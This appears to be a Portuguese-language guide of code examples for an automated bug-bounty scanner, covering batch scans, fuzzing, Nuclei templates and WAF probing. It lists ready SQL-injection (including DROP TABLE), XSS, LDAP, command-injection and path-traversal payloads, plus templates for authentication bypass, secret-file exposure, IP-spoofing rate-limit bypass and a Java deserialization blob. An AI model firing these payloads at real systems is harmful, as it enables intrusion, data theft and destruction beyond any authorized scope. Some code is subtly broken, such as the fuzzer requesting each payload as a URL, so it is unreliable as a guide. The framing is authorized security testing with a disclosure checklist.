# 🎯 Exemplos Práticos & Snippets Avançados

## 1️⃣ Exemplos de Uso

### Exemplo 1: Scan Rápido Automático
```python
#!/usr/bin/env python3
"""
Exemplo: Scan automático de múltiplos targets
Útil para monitoramento contínuo de programas de bug bounty
"""

import asyncio
from bounty_agent import BountyAgent
import json
from datetime import datetime

async def batch_scan(targets: list[str]):
    """Executa scans em batch"""
    agent = BountyAgent()
    all_findings = []
    
    for target in targets:
        print(f"\n{'='*60}")
        print(f"Scanning: {target}")
        print(f"{'='*60}")
        
        try:
            results = await agent.analyze_target(target)
            
            # Salvar resultados
            filename = f"report_{target.replace('https://', '').replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(f"reports/{filename}", "w") as f:
                json.dump(results, f, indent=2, default=str)
            
            # Extrair findings críticos
            critical = [f for f in results['nuclei_findings'] + results['fuzzing_findings'] 
                       if f.severity in ['critical', 'high']]
            
            if critical:
                print(f"\n⚠️  {len(critical)} ACHADOS CRÍTICOS:")
                for finding in critical:
                    print(f"  • {finding.title} ({finding.severity})")
                    print(f"    {finding.url}")
            
            all_findings.extend(results['nuclei_findings'] + results['fuzzing_findings'])
            
        except Exception as e:
            print(f"❌ Erro ao escanear {target}: {e}")
    
    # Sumário final
    print(f"\n{'='*60}")
    print(f"SUMÁRIO FINAL")
    print(f"{'='*60}")
    print(f"Total de targets: {len(targets)}")
    print(f"Total de findings: {len(all_findings)}")
    print(f"Críticos/Alto: {len([f for f in all_findings if f.severity in ['critical', 'high']])}")
    print(f"Médio: {len([f for f in all_findings if f.severity == 'medium'])}")
    print(f"Baixo/Info: {len([f for f in all_findings if f.severity in ['low', 'info']])}")


# Usar
targets = [
    "https://app1.bugbounty.com",
    "https://app2.bugbounty.com",
    "https://api.bugbounty.com",
]

asyncio.run(batch_scan(targets))
```

### Exemplo 2: Fuzzing Targetado em Endpoint Específico
```python
"""
Exemplo: Deep fuzzing em um endpoint específico
Quando você quer testar um endpoint em profundidade
"""

import asyncio
from bounty_agent import BountyAgent, ResponsibleFuzzer
import httpx

async def deep_fuzz_endpoint(url: str, param: str):
    """Faz fuzzing profundo em um endpoint"""
    
    # Payloads customizados
    advanced_payloads = {
        "sql": [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' OR 1=1--",
            "admin' OR 1=1--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'-alert(1)-'",
        ],
        "ldap": [
            "*",
            "*)(uid=*",
            "*))(&(uid=*",
            "admin*)(|(uid=*",
        ],
        "xpath": [
            "' or '1'='1",
            "' or 1=1 or '",
            "admin' or '1'='1",
        ],
        "command": [
            "; id",
            "| whoami",
            "& ipconfig",
            "` cat /etc/passwd `",
            "$(whoami)",
        ]
    }
    
    fuzzer = ResponsibleFuzzer(min_delay=1.0, max_delay=2.0)
    
    async with httpx.AsyncClient() as client:
        for category, payloads in advanced_payloads.items():
            print(f"\n🔍 Testando {category.upper()}...")
            
            for payload in payloads:
                test_url = f"{url}?{param}={httpx.Client().get(payload).text}"
                
                try:
                    response = await fuzzer._safe_request(client, "GET", test_url)
                    
                    if response and response.status_code == 200:
                        # Análise de resposta
                        response_indicators = {
                            "sql": ["SQL", "syntax", "MySQL", "postgresql"],
                            "xss": ["<script>", "javascript:", "onerror"],
                            "ldap": ["LDAP", "filter", "invalid"],
                            "xpath": ["XPath", "syntax error"],
                            "command": ["uid=", "root", "command not found"],
                        }
                        
                        indicators = response_indicators.get(category, [])
                        if any(ind in response.text for ind in indicators):
                            print(f"  ✅ POSSÍVEL {category.upper()} em: {test_url}")
                            print(f"     Payload: {payload}")
                            return
                
                except Exception as e:
                    print(f"  ❌ Erro: {e}")

# Usar
asyncio.run(deep_fuzz_endpoint(
    "https://target.com/search",
    "q"
))
```

### Exemplo 3: Análise Comparativa (Antes vs Depois de Patch)
```python
"""
Exemplo: Comparar resultados de scan antes e depois de um patch
"""

import json
from datetime import datetime
from difflib import unified_diff

async def compare_scans(target: str, previous_report_path: str):
    """Compara scan anterior com scan atual"""
    
    agent = BountyAgent()
    current_results = await agent.analyze_target(target)
    
    # Carregar scan anterior
    with open(previous_report_path, 'r') as f:
        previous_results = json.load(f)
    
    # Análise comparativa
    prev_findings = (
        previous_results['nuclei_findings'] + 
        previous_results['fuzzing_findings']
    )
    
    curr_findings = (
        current_results['nuclei_findings'] + 
        current_results['fuzzing_findings']
    )
    
    # Findings novos
    new_findings = [f for f in curr_findings 
                   if f['title'] not in [pf['title'] for pf in prev_findings]]
    
    # Findings resolvidos
    resolved = [f for f in prev_findings 
               if f['title'] not in [cf['title'] for cf in curr_findings]]
    
    print(f"""
    📊 COMPARAÇÃO DE SCANS
    
    Scan Anterior: {previous_report_path}
    Scan Atual: {datetime.now().isoformat()}
    
    ✅ RESOLVIDOS: {len(resolved)}
    """)
    for f in resolved:
        print(f"    • {f['title']}")
    
    print(f"""
    🆕 NOVOS ACHADOS: {len(new_findings)}
    """)
    for f in new_findings:
        print(f"    • {f['title']} ({f['severity']})")
    
    return {
        "new": new_findings,
        "resolved": resolved,
        "unchanged": len([f for f in curr_findings if f in prev_findings])
    }
```

---

## 2️⃣ Templates Nuclei Customizados

### Template 1: API Authentication Bypass
```yaml
# File: nuclei-templates/api-auth-bypass.yaml
id: api-auth-bypass
info:
  name: API Authentication Bypass
  author: security-team
  severity: high
  description: Testa bypass de autenticação em endpoints de API

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/admin"
      - "{{BaseURL}}/api/v1/users"
      - "{{BaseURL}}/api/v1/settings"
    
    headers:
      Authorization: "Bearer invalid_token"
      X-API-Key: "test"
    
    matchers:
      - type: status
        status:
          - 200
          - 201
      
      - type: word
        words:
          - "admin"
          - "user"
```

### Template 2: Sensitive Information Disclosure
```yaml
# File: nuclei-templates/sensitive-info.yaml
id: sensitive-info-disclosure
info:
  name: Sensitive Information Disclosure
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/web.config"
      - "{{BaseURL}}/config.php"
      - "{{BaseURL}}/settings.json"
      - "{{BaseURL}}/docker-compose.yml"
    
    matchers:
      - type: word
        words:
          - "password"
          - "secret"
          - "api_key"
          - "token"
          - "credentials"
        part: body
```

### Template 3: Rate Limiting Bypass
```yaml
# File: nuclei-templates/rate-limit-bypass.yaml
id: rate-limit-bypass
info:
  name: Rate Limiting Bypass
  severity: medium
  description: Testa técnicas de bypass de rate limiting

requests:
  - method: POST
    path: "{{BaseURL}}/api/login"
    
    body: '{"username":"admin","password":"test{{RequestNum}}"}'
    
    headers:
      X-Forwarded-For: "{{RandIP}}"
      User-Agent: "{{RandUA}}"
    
    payloads:
      RandIP:
        - type: randip
      RandUA:
        - type: ua
    
    matchers:
      - type: status
        status:
          - 200
```

### Template 4: Insecure Deserialization
```yaml
# File: nuclei-templates/insecure-deserialize.yaml
id: insecure-deserialization
info:
  name: Insecure Deserialization
  severity: critical

requests:
  - method: POST
    path: "{{BaseURL}}/api/process"
    
    body: |
      rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcql40bkqrNLsAgABTAAGbWVtYmVydAAcTGphdmEvdXRpbC9NYXA7eHBzcgA5c3VuLnJlZmxlY3QuYW5ub3RhdGlvbi5Bbm5vdGF0aW9uSW52b2NhdGlvbkhhbmRsZXIkTWVtYmVyVHlwZQAAAAAAAAABSQABSQAJdmFsdWV4cAAAAAA=
    
    matchers:
      - type: word
        words:
          - "java.lang.ProcessBuilder"
```

---

## 3️⃣ Snippets Avançados

### Snippet 1: Detecção Automática de Tipo de Aplicação
```python
"""
Identifica o tipo de aplicação para customizar fuzzing
"""

class AppTypeDetector:
    @staticmethod
    async def detect_app_type(client: httpx.AsyncClient, url: str) -> str:
        """Detecta tipo de aplicação (Django, Laravel, Node.js, etc)"""
        
        signatures = {
            "Django": [
                "django",
                "django-admin",
                "csrf_token",
                "HTTP_X_CSRFTOKEN"
            ],
            "Laravel": [
                "laravel",
                "XSRF-TOKEN",
                "_token",
                "artisan"
            ],
            "Flask": [
                "flask",
                "werkzeug",
                "jinja2"
            ],
            "Spring": [
                "jsessionid",
                "spring",
                "tomcat"
            ],
            "ASP.NET": [
                "aspx",
                "asp_net",
                "viewstate"
            ],
            "Node.js": [
                "express",
                "passport",
                "next.js"
            ]
        }
        
        try:
            response = await client.get(url)
            response_text = response.text.lower()
            headers = str(response.headers).lower()
            
            for app_type, indicators in signatures.items():
                if any(ind in response_text or ind in headers 
                      for ind in indicators):
                    return app_type
            
            return "Unknown"
        
        except Exception:
            return "Unknown"
```

### Snippet 2: Validação de Severity com Contexto
```python
"""
Calcula o impacto real da vulnerabilidade
"""

class ImpactAssessment:
    @staticmethod
    def assess(finding, context: dict) -> dict:
        """
        Avalia impacto real considerando:
        - Dados sensíveis acessáveis
        - Número de usuários afetados
        - Dados de autenticação necessários
        """
        
        base_severity = {
            "critical": 9.0,
            "high": 7.0,
            "medium": 5.0,
            "low": 3.0,
            "info": 1.0
        }[finding.severity]
        
        # Fatores multiplicadores
        multipliers = {
            "is_production": 1.5,  # Produção é pior
            "requires_auth": 0.7,   # Requer auth é menos pior
            "affects_pii": 1.3,     # Dados sensíveis
            "affects_payment": 1.5, # Dados de pagamento
            "rce_possible": 2.0,    # Escalação possível
        }
        
        score = base_severity
        for factor, multiplier in multipliers.items():
            if context.get(factor):
                score *= multiplier
        
        return {
            "base_severity": finding.severity,
            "contextual_score": min(score, 10.0),
            "recommendation": "REPORT_NOW" if score > 7.0 else "REPORT_LATER"
        }
```

### Snippet 3: Relatório com Histórico de Patches
```python
"""
Rastreia histórico de vulnerabilidades e patches
"""

class VulnerabilityTracker:
    def __init__(self, db_path: str = "vuln_history.json"):
        self.db_path = db_path
        self.history = self._load_history()
    
    def _load_history(self) -> dict:
        try:
            with open(self.db_path) as f:
                return json.load(f)
        except FileNotFoundError:
            return {}
    
    def record_finding(self, target: str, finding: Finding):
        """Registra um achado no histórico"""
        if target not in self.history:
            self.history[target] = []
        
        self.history[target].append({
            "date": datetime.now().isoformat(),
            "title": finding.title,
            "severity": finding.severity,
            "status": "OPEN"  # OPEN, REPORTED, RESOLVED
        })
        
        self._save_history()
    
    def _save_history(self):
        with open(self.db_path, 'w') as f:
            json.dump(self.history, f, indent=2)
    
    def get_trending(self, target: str, days: int = 30) -> dict:
        """Mostra tendências de vulnerabilidades"""
        if target not in self.history:
            return {}
        
        from datetime import timedelta, datetime as dt
        
        cutoff = dt.now() - timedelta(days=days)
        recent = [
            f for f in self.history[target]
            if dt.fromisoformat(f['date']) > cutoff
        ]
        
        return {
            "total": len(recent),
            "by_severity": {
                sev: len([f for f in recent if f['severity'] == sev])
                for sev in ["critical", "high", "medium", "low"]
            },
            "resolution_rate": len([f for f in recent if f['status'] == 'RESOLVED']) / len(recent) if recent else 0
        }
```

### Snippet 4: Integração com Telegram/Slack Notifications
```python
"""
Notificações em tempo real para achados críticos
"""

import aiohttp

class NotificationManager:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
    
    async def notify_critical_finding(self, finding: Finding):
        """Envia notificação para Slack/Telegram"""
        
        message = f"""
🚨 *VULNERABILIDADE CRÍTICA ENCONTRADA*

*Título:* {finding.title}
*Severidade:* {finding.severity}
*URL:* {finding.url}
*Descrição:* {finding.description}

Tempo: {finding.timestamp}
        """
        
        async with aiohttp.ClientSession() as session:
            payload = {
                "text": message,
                "attachments": [{
                    "color": "danger" if finding.severity == "critical" else "warning",
                    "title": finding.title,
                    "text": finding.description
                }]
            }
            
            async with session.post(self.webhook_url, json=payload) as resp:
                return resp.status == 200
```

### Snippet 5: Análise de Padrões WAF
```python
"""
Identifica padrões de bloqueio do WAF para otimizar fuzzing
"""

class WAFPatternAnalyzer:
    def __init__(self):
        self.blocked_patterns = []
        self.allowed_patterns = []
    
    async def analyze_waf_behavior(self, client: httpx.AsyncClient, base_url: str):
        """Identifica padrões que disparam WAF"""
        
        test_payloads = {
            "sql": ["' OR '1'='1", "'; DROP TABLE;--"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "path": ["../../../etc/passwd", "..\\..\\windows\\win.ini"],
        }
        
        results = {}
        
        for category, payloads in test_payloads.items():
            blocked_count = 0
            
            for payload in payloads:
                try:
                    response = await client.get(f"{base_url}?q={payload}")
                    
                    if response.status_code in [403, 406, 429]:
                        blocked_count += 1
                        self.blocked_patterns.append(payload)
                    else:
                        self.allowed_patterns.append(payload)
                
                except Exception:
                    blocked_count += 1
            
            results[category] = {
                "tested": len(payloads),
                "blocked": blocked_count,
                "block_rate": blocked_count / len(payloads)
            }
        
        return results
```

---

## 4️⃣ Checklist Rápido

```
□ Verificar escopo e autorização
□ Ler rules do programa de bug bounty
□ Configurar delays e rate limits
□ Preparar templates Nuclei
□ Testar em ambiente seguro primeiro
□ Monitorar logs de execução
□ Documentar todos os achados
□ Aguardar resposta antes de divulgar
□ Seguir timeline de divulgação responsável
□ Arquivar evidências
```

---

**Boa sorte com seus testes! 🎯**
